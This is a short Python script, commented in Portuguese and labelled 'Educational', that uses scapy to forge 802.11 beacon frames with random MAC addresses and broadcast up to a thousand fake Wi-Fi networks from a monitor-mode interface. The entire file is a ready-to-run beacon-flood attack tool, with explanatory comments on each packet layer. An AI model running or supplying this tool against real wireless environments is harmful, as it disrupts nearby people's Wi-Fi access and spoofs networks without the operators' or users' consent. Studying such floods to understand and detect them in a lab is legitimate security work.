from scapy.all import RadioTap, Dot11, Dot11Beacon, Dot11Elt, sendp
import random
import time
import argparse
from colorama import Fore, init

init(autoreset=True)

def gerar_mac():
    # Gera um MAC aleatório para o AP falso
    return "02:00:00:%02x:%02x:%02x" % (random.randint(0, 255), random.randint(0, 255), random.randint(0, 255))

def flood_beacon(interface, quantidade):
    print(Fore.CYAN + f"[*] Iniciando Beacon Flood na interface {interface}...")
    print(Fore.YELLOW + "[*] Pressione Ctrl+C para parar.\n")

    try:
        for i in range(quantidade):
            mac_falso = gerar_mac()
            ssid_falso = f"WiFi_Falso_{i}" # Nome da rede falsa

            # 1. RadioTap: A camada física (a placa de rede preenche os dados de canal)
            # 2. Dot11: O cabeçalho MAC.
            #    addr1 = Broadcast (ff:ff:ff:ff:ff:ff) para todo mundo ver
            #    addr2 = MAC falso (o transmissor)
            #    addr3 = MAC falso (o BSSID do AP)
            dot11 = Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=mac_falso, addr3=mac_falso)
            
            # 3. Dot11Beacon: O frame de Beacon (anúncio de rede)
            beacon = Dot11Beacon(cap="ESS") # ESS = Extended Service Set (rede normal)
            
            # 4. Dot11Elt: Os elementos de informação (o SSID é o principal)
            #    ID=0 significa "SSID", info=ssid_falso, len=tamanho do nome
            essid = Dot11Elt(ID=0, info=ssid_falso, len=len(ssid_falso))
            
            # Juntando tudo
            pacote = RadioTap() / dot11 / beacon / essid
            
            # Envia na camada 2 (Wi-Fi) usando sendp
            sendp(pacote, iface=interface, verbose=False)
            
            if i % 10 == 0:
                print(Fore.GREEN + f"[+] {i} redes falsas criadas...")

            time.sleep(0.01) # Delay para não sobrecarregar a placa

    except KeyboardInterrupt:
        print(Fore.YELLOW + "\n[!] Beacon Flood interrompido.")
    except Exception as e:
        print(Fore.RED + f"\n[-] Erro: {e}")
        print(Fore.RED + "[-] Verifique se a placa está em modo monitor.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Beacon Flood (Educational)")
    parser.add_argument("-i", "--interface", required=True, help="Interface em modo monitor (ex: wlan0mon)")
    parser.add_argument("-n", "--num", type=int, default=1000, help="Quantidade de redes a criar")
    args = parser.parse_args()
    
    flood_beacon(args.interface, args.num)
